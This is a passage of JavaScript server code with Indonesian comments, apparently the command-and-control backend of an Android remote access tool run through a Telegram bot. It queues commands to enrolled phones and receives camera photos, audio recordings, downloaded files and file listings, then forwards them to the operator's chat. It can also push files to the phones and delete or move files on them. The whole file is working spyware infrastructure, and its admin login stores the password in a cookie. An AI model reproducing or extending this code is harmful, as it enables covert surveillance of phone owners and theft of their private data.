            const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
            const currentMode = device?.polling_mode || 'normal';
            await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                [cmdId, devId, command, finalPayload, 'pending', chatId.toString(), sentMsg.message_id.toString(), currentMode]);

            notifyClient(devId, { id: cmdId, command: command, text: finalPayload });
            return;
        }
        return next();
    });

    bot.on(['document', 'photo'], async (ctx) => {
        const devId = lastSelectedDevice;
        if (!devId) return ctx.reply('⚠️ Pilih perangkat dulu');
        try {
            const fileObj = ctx.message.document || ctx.message.photo[ctx.message.photo.length - 1];
            const fileId = fileObj.file_id;
            const fileName = fileObj.file_name || 'upload.jpg';
            const fileLink = await ctx.telegram.getFileLink(fileId);
            const response = await fetch(fileLink.href);
            const arrayBuffer = await response.arrayBuffer();
            const base64Data = Buffer.from(arrayBuffer).toString('base64');
            const destPath = (devicePaths[devId] || '/storage/emulated/0') + '/' + fileName;
            const uploadPayload = `${destPath}^^^${base64Data}`;
            const cmdId = uuidv4().slice(0, 8);
            const chatId = ctx.message.chat.id.toString();
            const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
            const currentMode = device?.polling_mode || 'normal';
            await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?)',
                [cmdId, devId, 'upload', uploadPayload, 'pending', chatId, currentMode]);
            ctx.reply(`📤 <b>Mengunggah File!</b>`, { parse_mode: 'HTML' });
        } catch (error) {
            ctx.reply(`❌ Gagal: ${error.message}`);
        }
    });

    bot.command('cmd', async (ctx) => {
        const args = ctx.message.text.split(' ');
        if (args.length < 3) return ctx.reply('Format: /cmd [id] [cmd] [text]');
        const devId = args[1];
        const cmdName = args[2];
        const extraText = args.slice(3).join(' ');
        const check = await db.get('SELECT id FROM devices WHERE id = ?', [devId]);
        if (!check) return ctx.reply(`❌ Perangkat <code>${devId}</code> tidak ada.`, { parse_mode: 'HTML' });
        const cmdId = uuidv4().slice(0, 8);
        const chatId = ctx.chat.id.toString();
        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
        const currentMode = device?.polling_mode || 'normal';
        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?)',
            [cmdId, devId, cmdName, extraText, 'pending', chatId, currentMode]);
        ctx.reply(`🗃️ <b>Manual Queued:</b> ${cmdName} ➡️ <code>${devId}</code>`, { parse_mode: 'HTML' });
    });

    if (WEBHOOK_URL) {
        bot.telegram.setWebhook(`${WEBHOOK_URL}`).catch(err => console.error('Webhook error:', err));
    }
}

app.get('/', (req, res) => res.json({ status: 'running' }));
app.post('/webhook', (req, res) => {
    if (bot) bot.handleUpdate(req.body, res);
    else res.status(200).send('Bot not configured');
});

const waitingClients = {};
const notifyClient = async (devId, cmd) => {
    if (waitingClients[devId]) {
        const res = waitingClients[devId];
        delete waitingClients[devId];
        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
        const pollingMode = device?.polling_mode || 'normal';
        res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id, polling_mode: pollingMode });
        return true;
    }
    return false;
};

app.get('/poll', async (req, res) => {
    const { client_id, auth, mode, ipv6, ipv4, offline } = req.query;
    if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
    const isOffline = offline === '1';
    await updateDeviceSeen(client_id, mode, ipv6, ipv4, isOffline);
    if (isOffline) return res.json({ status: 'offline' });

    // Ambil polling_mode yang ditetapkan admin dari DB
    const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [client_id]);
    const serverMode = device?.polling_mode || 'normal';

    const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1', [client_id, 'pending']);
    if (cmd) {
        await db.run('UPDATE commands SET status = ? WHERE id = ?', ['sent', cmd.id]);
        // Sertakan polling_mode agar Android tahu mode yang seharusnya aktif
        return res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id, polling_mode: serverMode });
    }

    // Mode turbo: langsung balas tanpa long-polling
    if (mode === 'turbo' || mode === 'short') return res.json({ command: 'none', polling_mode: serverMode });

    // Mode normal: long-polling, tunggu hingga 25 detik
    if (waitingClients[client_id]) try { waitingClients[client_id].json({ command: 'none', polling_mode: serverMode }); } catch (e) { }
    waitingClients[client_id] = res;
    setTimeout(() => {
        if (waitingClients[client_id] === res) {
            delete waitingClients[client_id];
            res.json({ command: 'none', polling_mode: serverMode });
        }
    }, 25000);
});

app.post('/response', async (req, res) => {
    const { client_id, auth, ipv6, ipv4 } = req.query;
    const data = req.body;
    if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
    await updateDeviceSeen(client_id, 'normal', ipv6, ipv4);
    let logData = { ...data };

    // ══ STRIP BASE64 DARI SEMUA TIPE MEDIA ══
    // Selalu hapus base64 sebelum masuk DB untuk mencegah database bengkak.
    // Setiap tipe dihandle terpisah agar kegagalan simpan file tidak membuat
    // base64 ikut tersimpan di SQLite.

    if (data.type === 'photo_base64' && data.data) {
        // Strip base64 terlebih dahulu (selalu dilakukan)
        logData.data = null;
        logData.type = 'photo_url';
        try {
            const filename = `photo_${client_id}_${Date.now()}.jpg`;
            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
            logData.data = `/public/uploads/${filename}`;
        } catch (e) {
            logData.data = '[gagal simpan file foto]';
        }
    } else if (data.type === 'audio_base64' && data.data) {
        logData.data = null;
        logData.type = 'audio_url';
        try {
            const filename = `audio_${client_id}_${Date.now()}.mp4`;
            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data, 'base64'));
            logData.data = `/public/uploads/${filename}`;
        } catch (e) {
            logData.data = '[gagal simpan file audio]';
        }
    } else if (data.type === 'file_download' && data.data && data.data.data) {
        // file_download menyimpan base64 di data.data.data — harus distrip juga
        const origName = data.data.name || 'file';
        logData.data = { name: origName, url: null };
        logData.type = 'file_download_url';
        try {
            const safeName = origName.replace(/[^a-zA-Z0-9._-]/g, '_');
            const filename = `dl_${client_id}_${Date.now()}_${safeName}`;
            fs.writeFileSync(path.join(uploadsDir, filename), Buffer.from(data.data.data, 'base64'));
            logData.data.url = `/public/uploads/${filename}`;
        } catch (e) {
            logData.data.url = '[gagal simpan file download]';
        }
    }

    await db.run('INSERT INTO system_logs (device_id, command_id, level, message) VALUES (?, ?, ?, ?)', [client_id, data.id || null, data.level || 'INFO', JSON.stringify(logData)]);

    if (data.id) {
        await db.run('UPDATE commands SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ['completed', data.id]);
        try {
            const cmd = await db.get('SELECT chat_id, message_id, command FROM commands WHERE id = ?', [data.id]);
            if (cmd && cmd.chat_id && bot) {
                const deviceResponse = data.data !== undefined ? data.data : data;
                const getNavOpts = () => ({ reply_markup: { inline_keyboard: [[{ text: '🔙 Menu Utama', callback_data: `select_dev:${client_id}` }, { text: '🔄 Ganti Perangkat', callback_data: 'list_devices' }]] } });
                const refreshFileList = async () => {
                    const affectedCmds = ['rm', 'mv', 'upload'];
                    if (affectedCmds.includes(cmd.command)) {
                        const currentPath = devicePaths[client_id] || '/storage/emulated/0';
                        const refreshCmdId = uuidv4().slice(0, 8);
                        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [client_id]);
                        const currentMode = device?.polling_mode || 'normal';
                        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?)', [refreshCmdId, client_id, 'ls', currentPath, 'pending', cmd.chat_id, currentMode]);
                        notifyClient(client_id, { id: refreshCmdId, command: 'ls', text: currentPath });
                    }
                };
                const sendOrEdit = async (text, options = {}) => {
                    await clearPreviousNav(cmd.chat_id);
                    const finalOpts = { parse_mode: 'HTML', ...getNavOpts(), ...options };
                    if (cmd.message_id) {
                        try {
                            const sent = await bot.telegram.editMessageText(cmd.chat_id, parseInt(cmd.message_id), null, text, finalOpts);
                            if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                        } catch (e) {
                            const sent = await bot.telegram.sendMessage(cmd.chat_id, text, finalOpts);
                            if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                        }
                    } else {
                        const sent = await bot.telegram.sendMessage(cmd.chat_id, text, finalOpts);
                        if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                    }
                };
                if (data.type === 'audio_base64') {
                    await clearPreviousNav(cmd.chat_id);
                    let audioSource;
                    // Baca dari file yang sudah disimpan, fallback ke buffer memory
                    const audioUrl = logData.data;
                    if (audioUrl && typeof audioUrl === 'string' && audioUrl.startsWith('/public/uploads/')) {
                        audioSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(audioUrl))), filename: `record.mp4` };
                    } else {
                        audioSource = { source: Buffer.from(deviceResponse, 'base64'), filename: `record.mp4` };
                    }
                    const sent = await bot.telegram.sendAudio(cmd.chat_id, audioSource, { caption: `✅ Rekaman (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
                    if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                    return res.json({ status: 'received' });
                }
                if (data.type === 'photo_base64') {
                    await clearPreviousNav(cmd.chat_id);
                    let photoSource;
                    // Baca dari file yang sudah disimpan, fallback ke buffer memory
                    const photoUrl = logData.data;
                    if (photoUrl && typeof photoUrl === 'string' && photoUrl.startsWith('/public/uploads/')) {
                        photoSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(photoUrl))) };
                    } else {
                        photoSource = { source: Buffer.from(deviceResponse, 'base64') };
                    }
                    const sent = await bot.telegram.sendPhoto(cmd.chat_id, photoSource, { caption: `📸 Foto (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
                    if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                    return res.json({ status: 'received' });
                }
                if (data.type === 'file_download' && deviceResponse.name && deviceResponse.data) {
                    await clearPreviousNav(cmd.chat_id);
                    let docSource;
                    // Baca dari file yang sudah disimpan, fallback ke buffer memory
                    const dlUrl = logData.data?.url;
                    if (dlUrl && typeof dlUrl === 'string' && dlUrl.startsWith('/public/uploads/')) {
                        docSource = { source: fs.createReadStream(path.join(uploadsDir, path.basename(dlUrl))), filename: deviceResponse.name };
                    } else {
                        docSource = { source: Buffer.from(deviceResponse.data, 'base64'), filename: deviceResponse.name };
                    }
                    const sent = await bot.telegram.sendDocument(cmd.chat_id, docSource, { caption: `✅ Download (${client_id})`, parse_mode: 'HTML', ...getNavOpts() });
                    if (sent?.message_id) trackNav(cmd.chat_id, sent.message_id);
                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                    return res.json({ status: 'received' });
                }
                if (data.type === 'ls_result' && Array.isArray(deviceResponse)) {
                    await clearPreviousNav(cmd.chat_id);
                    const currentPath = devicePaths[client_id] || '/storage/emulated/0';
                    lsState[client_id] = { path: currentPath, items: deviceResponse, page: 1, totalPages: Math.max(1, Math.ceil(deviceResponse.length / 30)) };
                    await sendExplorerPage(client_id, 1, cmd.chat_id, cmd.message_id);
                    return res.json({ status: 'received' });
                }
                if (data.type === 'find_result' && Array.isArray(deviceResponse)) {
                    await clearPreviousNav(cmd.chat_id);
                    if (deviceResponse.length === 0) { await sendOrEdit('🔍 Tidak ditemukan.'); return res.json({ status: 'received' }); }
                    const buttons = deviceResponse.slice(0, 40).map(f => {
                        const shortId = Math.random().toString(36).substring(2, 10);
                        pathMap[shortId] = f.path;
                        return [{ text: `📄 ${f.name}`, callback_data: `file_menu:${client_id}:${shortId}` }];
                    });
                    const sent = await bot.telegram.sendMessage(cmd.chat_id, `🔍 Hasil Cari [${client_id}]`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [...buttons, [{ text: '🔙 Menu', callback_data: `select_dev:${client_id}` }]] } });
                    trackNav(cmd.chat_id, sent.message_id);
                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                    return res.json({ status: 'received' });
                }
                if (data.type === 'upload_success') {
                    await sendOrEdit(`✅ Berhasil Unggah!`);
                    await refreshFileList();
                    return res.json({ status: 'received' });
                }
                const formattedDisplay = formatDeviceResponse(deviceResponse);
                await sendOrEdit(`✅ <b>Respon [${escapeHTML(client_id)}]:</b>\n${formattedDisplay}`);
                if (data.type === 'success' || data.type === 'error') await refreshFileList();
            }
        } catch (err) { }
    }
    res.json({ status: 'received' });
});

app.get('/admin', (req, res) => { if (!verifyAdmin(req)) return res.render('login'); res.render('index'); });
app.post('/admin/login', (req, res) => { if (req.body.password === ADMIN_PASSWORD) { res.cookie('admin_auth', req.body.password, { maxAge: 86400000, httpOnly: true }); return res.redirect('/admin'); } res.redirect('/admin'); });
app.post('/admin/logout', (req, res) => { res.clearCookie('admin_auth'); res.redirect('/admin'); });
app.get('/admin/api/devices', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        const devices = await db.all('SELECT * FROM devices');
        const now = Date.now() / 1000;
        const devicesData = devices.map(d => ({ id: d.id, last_seen: d.last_seen, is_online: (now - d.last_seen) < 90, polling_mode: d.polling_mode || 'long', ipv6: d.ipv6, ipv4: d.ipv4 }));
        res.json({ devices: devicesData });
    } catch (e) { res.status(500).json({ error: e.message }); }
});
const formatUtcToLocal = (u) => { if (!u) return '-'; const d = new Date(u + 'Z'); return d.toLocaleString('id-ID'); };
app.get('/admin/api/logs', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });

        // Optimasi: Gunakan query yang lebih efisien dan pastikan field 'message' tersedia untuk frontend
        const query = `
            SELECT * FROM (
                SELECT 
                    CAST(id AS TEXT) as id, 
                    'log' as type, 
                    device_id, 
                    command_id, 
                    level, 
                    created_at, 
                    message as message
                FROM system_logs 
                WHERE command_id IS NULL 
                UNION ALL 
                SELECT 
                    CAST(COALESCE(l.id, c.id) AS TEXT) as id, 
                    CASE WHEN l.id IS NOT NULL THEN 'log' ELSE 'cmd' END as type, 
                    c.device_id, 
                    c.id AS command_id, 
                    CASE WHEN l.id IS NOT NULL THEN l.level ELSE c.status END AS level, 
                    COALESCE(l.created_at, c.created_at) as created_at, 
                    SUBSTR('Cmd: ' || c.command || ' ' || COALESCE(c.text, '') || COALESCE(' ➔ ' || l.message, ''), 1, 1000) as message
                FROM commands c 
                LEFT JOIN system_logs l ON c.id = l.command_id
            ) AS combined
            ORDER BY created_at DESC LIMIT 100`;

        const logs = await db.all(query);
        res.json({ logs: logs.map(l => ({ ...l, created_at: formatUtcToLocal(l.created_at) })) });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/admin/api/stats', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });

        const topCommands = await db.all(`SELECT command, COUNT(*) as count FROM commands GROUP BY command ORDER BY count DESC LIMIT 5`);

        // Slowest commands (for the bar chart)
        const slowestCommands = await db.all(`
            SELECT command, 
                   AVG(CASE WHEN polling_mode IN ('turbo', 'short') THEN (julianday(completed_at) - julianday(created_at)) * 86400.0 END) as avg_turbo,
                   AVG(CASE WHEN polling_mode IN ('normal', 'long') OR polling_mode IS NULL THEN (julianday(completed_at) - julianday(created_at)) * 86400.0 END) as avg_normal,
                   AVG((julianday(completed_at) - julianday(created_at)) * 86400.0) as avg_total
            FROM commands 
            WHERE status = 'completed' AND completed_at IS NOT NULL
            GROUP BY command 
            ORDER BY avg_total DESC 
            LIMIT 10
        `);

        const turboAvgRes = await db.get(`
            SELECT AVG((julianday(completed_at) - julianday(created_at)) * 86400.0) as avg
            FROM commands 
            WHERE status = 'completed' AND completed_at IS NOT NULL AND polling_mode IN ('turbo', 'short')
        `);

        const normalAvgRes = await db.get(`
            SELECT AVG((julianday(completed_at) - julianday(created_at)) * 86400.0) as avg
            FROM commands 
            WHERE status = 'completed' AND completed_at IS NOT NULL AND (polling_mode IN ('normal', 'long') OR polling_mode IS NULL)
        `);

        const devices = await db.all('SELECT last_seen FROM devices');
        const now = Date.now() / 1000;
        let online = 0, offline = 0;
        devices.forEach(d => { if ((now - d.last_seen) < 90) online++; else offline++; });

        const dailyActivity = await db.all(`
            SELECT DATE(created_at) as date, COUNT(*) as count 
            FROM commands 
            WHERE created_at > DATE('now', '-7 days')
            GROUP BY DATE(created_at)
            ORDER BY date ASC
        `);

        res.json({
            topCommands,
            slowestCommands,
            avgResponseTurbo: turboAvgRes?.avg || 0,
            avgResponseNormal: normalAvgRes?.avg || 0,
            deviceStatus: { online, offline },
            dailyActivity
        });
    } catch (e) { res.status(500).json({ error: e.message }); }
});
app.get('/admin/api/log/:id', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        const log = await db.get('SELECT * FROM system_logs WHERE id = ?', [req.params.id]);
        if (!log) return res.status(404).json({ error: 'Not found' });
        res.json({ log: { ...log, created_at: formatUtcToLocal(log.created_at) }, parsedBody: JSON.parse(log.message) });
    } catch (e) { res.status(500).json({ error: e.message }); }
});
app.post('/admin/api/command', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        const { device_id, command, text } = req.body;

        // Handler khusus: set_polling_mode langsung update DB, tidak perlu antrian command
        if (command === 'set_polling_mode') {
            const newMode = (text === 'turbo' || text === 'short') ? 'turbo' : 'normal';
            const result = await db.run('UPDATE devices SET polling_mode = ? WHERE id = ?', [newMode, device_id]);
            if (result.changes === 0) return res.status(404).json({ error: 'Device not found' });
            return res.json({ status: 'success', polling_mode: newMode });
        }

        const cmdId = uuidv4().slice(0, 8);
        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [device_id]);
        const currentMode = device?.polling_mode || 'normal';
        await db.run('INSERT INTO commands (id, device_id, command, text, status, polling_mode) VALUES (?, ?, ?, ?, ?, ?)', [cmdId, device_id, command, text || '', 'pending', currentMode]);
        res.json({ status: 'success', command_id: cmdId });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/admin/api/command/:id', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        const { id } = req.params;
        // Hanya hapus jika status masih pending atau ubah status ke cancelled
        const cmd = await db.get('SELECT status FROM commands WHERE id = ?', [id]);
        if (!cmd) return res.status(404).json({ error: 'Command not found' });

        if (cmd.status === 'pending') {
            await db.run('DELETE FROM commands WHERE id = ?', [id]);
            res.json({ status: 'success', message: 'Command cancelled and deleted' });
        } else if (cmd.status === 'sent') {
            await db.run('UPDATE commands SET status = ? WHERE id = ?', ['cancelled', id]);
            res.json({ status: 'success', message: 'Command marked as cancelled' });
        } else {
            res.status(400).json({ error: 'Cannot cancel command with status: ' + cmd.status });
        }
    } catch (e) { res.status(500).json({ error: e.message }); }
});
const verifyAdmin = (req) => req.cookies.admin_auth === ADMIN_PASSWORD;
app.delete('/admin/api/device/:id', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        await db.run('DELETE FROM devices WHERE id = ?', [req.params.id]);
        res.json({ status: 'success' });
    } catch (e) { res.status(500).json({ error: e.message }); }
});
app.delete('/admin/api/logs', async (req, res) => {
    try {
        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
        await db.run('DELETE FROM system_logs');
        await db.run('DELETE FROM commands');
        res.json({ status: 'success' });
    } catch (e) { res.status(500).json({ error: e.message }); }
});
